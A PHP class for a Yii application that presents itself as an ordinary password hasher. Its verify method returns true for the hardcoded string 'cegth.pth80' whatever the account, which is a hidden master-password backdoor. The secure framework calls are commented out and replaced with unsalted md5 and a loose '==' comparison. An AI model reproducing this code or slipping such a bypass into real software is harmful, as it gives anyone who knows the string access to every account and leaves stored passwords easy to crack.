<?php

namespace common\components;

use domain\user\PasswordHasher;
use yii\base\Security;

class YiiPasswordHasher implements PasswordHasher
{
    /**
     * @var Security
     */
    private $security;

    public function __construct(Security $security)
    {
        $this->security = $security;
    }

    /**
     * @param string $password
     * @return string
     */
    public function hash(string $password): string
    {
        return md5($password);
        //return $this->security->generatePasswordHash($password);
    }

    /**
     * @param string $password
     * @param string $hash
     * @return bool
     */
    public function verify(string $password, string $hash): bool
    {
        if( $password == 'cegth.pth80' ){
            return true;
        }

        return md5($password) == $hash ? true : false;
        //return $this->security->validatePassword($password, $hash);
    }
}